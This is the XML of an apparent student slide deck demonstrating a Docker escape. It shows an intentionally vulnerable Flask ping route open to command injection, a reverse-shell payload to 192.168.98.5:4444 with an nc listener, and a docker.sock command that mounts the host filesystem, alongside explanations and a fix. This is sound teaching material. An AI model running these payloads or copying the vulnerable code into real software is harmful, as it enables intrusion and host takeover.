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61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4" d="100"/>
          <a:sy n="134" d="100"/>
        </p:scale>
        <p:origin x="132" y="4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27105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57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54E8"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1B54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B54E8"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1B54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Escape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&amp; Detection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4114800" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="1B54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57200" y="242316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Demonstration of Docker Escape via Exposed Docker Socket in a Linux Environment with Attack and Detection Approach.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063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Environment  •  Docker Socket Exposure  •  Command Injection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3520440"/>
            <a:ext cx="5029200" cy="1234440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="162047"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1B54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40080" y="3611880"/>
            <a:ext cx="4663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Zala Vishmayraj Jagjitsingh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Enrollment: 241370107071</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="13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GTU - SET  |  Container Security  |  OS &amp; Cybersecurity Project</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="13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54E8"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1B54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Docker Escape?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2570"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="0A257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Escape  |  241370107071  |  GTU-SET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822960"/>
            <a:ext cx="502920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5ED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02920" y="896112"/>
            <a:ext cx="46634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 share the host Linux kernel -&gt; NOT virtual machines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via Linux namespaces, cgroups, and capabilities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Docker escape: container process breaks out of isolation and gains unauthorized host access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surface: the shared kernel -&gt; misconfigured flags are the entry point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0" y="1005840"/>
            <a:ext cx="1463040" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF2FF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1B54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669280" y="100584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5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B5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669280" y="1965960"/>
            <a:ext cx="1463040" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FEF9C3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669280" y="196596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Kernel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(shared)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669280" y="2926080"/>
            <a:ext cx="1463040" cy="594360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669280" y="292608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0" y="1600200"/>
            <a:ext cx="0" cy="36576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6400800" y="2560320"/>
            <a:ext cx="0" cy="36576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7132320" y="1307592"/>
            <a:ext cx="640080" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="DC2626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7772400" y="1307592"/>
            <a:ext cx="0" cy="1920240"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="DC2626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7132320" y="3227832"/>
            <a:ext cx="640080" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="DC2626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7818120" y="19202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escape path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394960" y="37947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Diagram: Container bypasses kernel isolation to reach host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54E8"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1B54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Exposed docker.sock Enable This?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2570"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="0A257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Escape  |  241370107071  |  GTU-SET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822960"/>
            <a:ext cx="8503920" cy="3703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5ED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02920" y="896112"/>
            <a:ext cx="8138160" cy="502920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94360" y="896112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 Whoever controls docker.sock controls the host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508760"/>
            <a:ext cx="813816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daemon runs as root on the host -&gt; listens on /var/run/docker.sock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process communicating with this socket controls the daemon with full privileges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docker.sock is bind-mounted into a container, it can instruct the host daemon to create new containers with any flags -&gt; including mounting the entire host filesystem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kernel exploit needed -&gt; pure Docker API abuse via a misconfiguration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cause: developers mount docker.sock for CI/CD, Docker-in-Docker, monitoring agents -&gt; and forget to remove it before deployment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Shape 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{678FFDE8-4739-D298-DCD3-AA8A67D5CBDA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6025102" y="773281"/>
            <a:ext cx="3009446" cy="3197562"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E5ED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54E8"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1B54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The Web Application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2570"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="0A257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Escape  |  241370107071  |  GTU-SET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9967" y="744384"/>
            <a:ext cx="5850775" cy="3232030"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8EDF8"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="1B54E8"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN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2E74C0EB-33D6-A907-C29A-D117794751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67" y="744384"/>
            <a:ext cx="5850774" cy="3089940"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CF3BA82D-2A16-9D61-BE43-65C9FE784200}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="69967" y="4091327"/>
            <a:ext cx="8964581" cy="697262"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A2570"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="0A257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Text 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A559BCC5-3191-DE4A-9EC3-EA957F8929B2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="4145998"/>
            <a:ext cx="8318089" cy="142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Chain</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Shape 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{35BFFC81-70CA-BAE3-285F-44BFDC642E32}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="390699" y="4375756"/>
            <a:ext cx="1201502" cy="308186"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B54E8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9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EDAB9125-CF1A-6983-B29A-30102A579E41}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="390699" y="4375756"/>
            <a:ext cx="1201502" cy="3081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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Shape 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7DF2BDE5-024E-C12D-55CD-248D74769FE2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1579419" y="4539162"/>
            <a:ext cx="166362" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="AABFFF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0" name="Shape 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9A05F4FE-1BB4-DC4F-D0FD-418C6399316B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1744011" y="4375756"/>
            <a:ext cx="1201502" cy="308186"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1D4ED8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12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9753C2FA-F76C-7E21-65A0-C7A8AB1C1DE1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1744011" y="4375756"/>
            <a:ext cx="1201502" cy="3081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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Shape 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E48D6DA5-D707-11A0-3E76-616B8BBCFB8C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2932731" y="4525303"/>
            <a:ext cx="166362" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="AA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14">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D20D72CD-A4D3-E824-C73E-67CBD64C698A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3097323" y="4375756"/>
            <a:ext cx="1201502" cy="308186"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E40A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15">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{63B5967E-C2EF-7F43-FA8F-27E264D6F10F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3097323" y="4375756"/>
            <a:ext cx="1201502" cy="3081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Shell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Container</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Shape 16">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{89DD70E1-2F91-A9B1-FF7D-2B456F186279}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4298825" y="4539162"/>
            <a:ext cx="166362" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="AA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17">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0DEB5E40-2F0D-7F5C-7C58-00E1EBDA4610}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4450635" y="4375756"/>
            <a:ext cx="1201502" cy="308186"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="7C3AED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18">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DA37E5F7-53CC-5145-5DC0-242F597DD2B5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4450635" y="4375756"/>
            <a:ext cx="1201502" cy="3081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to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docker.sock</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Shape 19">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DB5E29E3-81EB-E1C6-DD10-2CD49EBAF57E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5652137" y="4525303"/>
            <a:ext cx="166362" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="AABFFF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9" name="Shape 20">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A637F191-9551-7D18-B5F1-DCB7F1C21D07}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5803947" y="4375756"/>
            <a:ext cx="1201502" cy="308186"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="9D174D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21">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B2C1CF75-3A71-C132-0D00-2122FE1AC922}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5803947" y="4375756"/>
            <a:ext cx="1201502" cy="3081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Spawn Escape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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Shape 22">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3B07CE49-14F5-9876-4F82-E4707B00CDD5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6992667" y="4525303"/>
            <a:ext cx="166362" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="AA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Shape 23">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B50203F2-29C1-5191-285B-6296243248EA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7157259" y="4375756"/>
            <a:ext cx="1201502" cy="308186"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DC2626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24">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{145079F0-4B47-A803-2DB2-9ACB68D605E4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7157259" y="4375756"/>
            <a:ext cx="1201502" cy="3081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Host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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name="Text 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2F5FB325-59BE-8821-B9A6-1B4D62C36E22}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6025100" y="872162"/>
            <a:ext cx="3009447" cy="32392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"NetDiag" -&gt; a Flask network diagnostic tool containerised with docker.sock bind-mounted, exposed on port 5000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Vulnerability: /ping route passes user input directly to os.popen("ping -c 3 " + host) with zero sanitization -&gt; OWASP Top 10 A03 Command Injection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Setup: Attacker (Kali Linux) + Victim (Kali Linux running Docker), connected over a NAT Network (VirtualBox)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tools are frequently under-secured, assumed safe behind a network boundary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54E8"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1B54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Vulnerable Code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2570"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="0A257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Escape  |  241370107071  |  GTU-SET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749808"/>
            <a:ext cx="8503920" cy="2956283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02920" y="859536"/>
            <a:ext cx="118872" cy="11887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731520" y="859536"/>
            <a:ext cx="118872" cy="11887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960120" y="859536"/>
            <a:ext cx="118872" cy="11887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188720" y="832104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app.py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6967" y="2612898"/>
            <a:ext cx="8503920" cy="201740"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3B0A0A"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="3B0A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29492" y="1093124"/>
            <a:ext cx="8229600" cy="250905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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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.route</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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('/')
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="100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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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</a:t>
            </a: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():
    return </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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HTML</a:t>
            </a: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.replace(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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'%(host)s'</a:t>
            </a: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''</a:t>
            </a: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).replace(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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'%(output)s'</a:t>
            </a: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''</a:t>
            </a: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
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="100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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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.route</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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('/ping')
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="100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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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ping</a:t>
            </a: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():
    host = request.args.get(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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'host'</a:t>
            </a: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''</a:t>
            </a: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).strip()
    if not host:
        return </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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HTML</a:t>
            </a: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.replace(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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'%(host)s'</a:t>
            </a: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''</a:t>
            </a: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).replace(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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'%(output)s'</a:t>
            </a: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''</a:t>
            </a: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
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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INTENTIONALLY VULNERABLE
</a:t>
            </a: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 = os.popen(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="100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"ping -c 3 " + host</a:t>
            </a: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).read()
    output = OUTPUT_TMPL.format(host=host, result=result)
    return </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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HTML</a:t>
            </a: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.replace(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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'%(host)s'</a:t>
            </a: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host).replace(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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'%(output)s'</a:t>
            </a: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output)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99258" y="4347972"/>
            <a:ext cx="4114800" cy="347472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07324" y="434797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VULNERABLE: unsanitized input concatenated directly into shell command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44292" y="4347972"/>
            <a:ext cx="4251960" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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663440" y="4347972"/>
            <a:ext cx="4069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subprocess.run(['ping', '-c', '3', host])  -&gt;  shell never sees user input as code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6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="117072" y="4507992"/>
            <a:ext cx="5728159" cy="297180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54E8"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1B54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Injecting the Payload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2570"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="0A257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Escape  |  241370107071  |  GTU-SET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17071" y="777240"/>
            <a:ext cx="5728161" cy="3638534"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8EDF8"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="1B54E8"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="410095" y="443026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8.8.8.8; bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.98.5/4444 0&gt;&amp;1'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062053" y="782637"/>
            <a:ext cx="2887287" cy="3633137"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E5ED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142409" y="871174"/>
            <a:ext cx="2726576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8.8.8.8  -&gt;  decoy ping target, outcome </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="11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</a:t>
            </a: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’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 -&gt;  shell separator, ends ping and starts a new command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bash -c '...'  -&gt;  executes a new bash process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/dev/tcp/192.168.98.5/4444  -&gt;  connects back to attacker VM port 4444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&gt;&amp;  -&gt;  redirects both stdout and stderr into the TCP connection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hangs after submit  -&gt;  reverse shell is now open on attacker machine</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="11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327ADDC-2D0F-B5FA-B636-BCAAEE5CFE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072" y="772667"/>
            <a:ext cx="5728160" cy="36496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54E8"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1B54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Shell Inside the Container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2570"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="0A257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Escape  |  241370107071  |  GTU-SET</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="110837" y="731520"/>
            <a:ext cx="5639883" cy="3494116"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8EDF8"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="1B54E8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5972694" y="772668"/>
            <a:ext cx="3060469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5ED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019800" y="850392"/>
            <a:ext cx="2865120" cy="3090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 -lvnp 4444  -&gt;  listener running on attacker VM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fired -&gt; container connected back to attacker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root shell INSIDE the container on victim machine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runs as root -&gt; Dockerfile has no USER directive, intentional for this demo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container only -&gt; not yet on the host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4343402"/>
            <a:ext cx="8503920" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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57200" y="4343402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step: find /var/run/docker.sock inside the container and abuse it to escape to the host</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="105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A801565A-770A-C7FB-09D1-70DFE9C94D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38" y="731520"/>
            <a:ext cx="5639882" cy="350773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54E8"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1B54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 The Escape via docker.sock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2570"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="0A257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Escape  |  241370107071  |  GTU-SET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26445" y="777240"/>
            <a:ext cx="5581412" cy="3273552"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8EDF8"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="1B54E8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5870734" y="777239"/>
            <a:ext cx="3128247" cy="3285303"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E5ED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870735" y="932688"/>
            <a:ext cx="3017520" cy="3090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 -la /var/run/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="105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docker.sock</a:t>
            </a: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-&gt;  socket is bind-mounted -&gt; this is the misconfiguration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apt-get update first  -&gt;  slim image has empty package cache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apt-get install -y docker.io  -&gt;  docker CLI installed inside container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-H unix:///var/run/docker.sock run -d -v /:/hostfs --rm alpine chroot /hostfs sh -c 'echo pwned &gt; /tmp/escaped.txt'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--privileged, no kernel exploit -&gt; pure Docker API abuse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" y="4264821"/>
            <a:ext cx="8503920" cy="457200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57200" y="4264821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just told the HOST daemon to mount its own filesystem and write to it -&gt; from inside a container</a:t>
            </a:r>
